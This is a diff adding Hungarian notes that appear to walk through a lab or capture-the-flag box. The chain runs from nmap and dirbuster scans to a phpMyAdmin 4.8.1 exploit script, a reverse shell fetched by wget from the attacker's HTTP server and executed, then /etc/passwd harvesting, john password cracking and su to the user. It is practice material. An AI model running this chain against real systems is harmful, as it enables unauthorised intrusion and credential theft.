@@ -1,0 +1,56 @@
+sudo bash
+nmap -sS -p- -T4 40.0.5.1
+nmap -sS -sV (-sC) -p 80 -T4 40.0.5.1
+
+dirbuster
+thread 50-re
+usr/share/wordlists/dirb/common.txt
+Be Recursive X
+megvan a phpmyadmin jobbklikkel hogy 4.8.1
+
+exploitdb -> phpymyadmin 4.8.1
+elsőt lementeni gep.py néven
+python3 gep.py 40.0.5.1 80 /phpmyadmin pma pmapass whoami ("python3 --version")
+
+googlebe reverse shell onliner
+2. link github -> python -> 2. kimásolása
+geanyben a végén bin/sh -> bin/bash, elején python -> python3, ip és port átírása ->
+-> ip a (30.0.0.101, 4444)
+lementeni script.py néven
+
+
+a listenerrel abban a mappában kell lenni ahonnan lekéred ezt (Desktop)
+	cd Desktop/
+	nc -lvnp 4444
+
+		cd Desktop/
+		python3 -m http.server
+
+(a http.server a 8000-es portot adta ki)
+python3 gep.py 40.0.5.1 80 /phpmyadmin pma pmapass "cd /temp ;wget http://30.0.0.101:8000/script.py; chmod 777 script.py;./tmp/script.py;"
+python3 gep.py 40.0.5.1 80 /phpmyadmin pma pmapass "cd /tmp;rm /tmp/script.py ;wget http://30.0.0.101:8000/script.py;
+(folyt) chmod +x /tmp/script.py;/tmp/script.py;"
+
+(SZERINTEM ELÉG EZ)
+python3 gep.py 40.0.5.1 80 /phpmyadmin pma pmapass "cd /tmp;wget http://30.0.0.101:8000/script.py;chmod +x /tmp/script.py;/tmp/script.py;"
+
+ilyenkor bent vagyunk az nc -lvnp gépen
+	find / -perm  -u=s 2>/dev/null
+
+új terminal ott ugyanezt beírjuk hogy összehasonlítsuk a 2-t
+	cd/usr/bin
+	ls -la
+	cat /etc/passwd
+	itt a bob-osat copyzni
+geany-ben elmenteni john (nincs kiterjesztés) néven
+
+még1 új terminal
+				john john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt
+kingkong a jelszó bob-hoz
+	su bob
+	kingkong jelszónak
+	cd ~
+	ls -la
+	python3 pwesent_from_juliet.py
+	cat pwesent_from_juliet.py
+
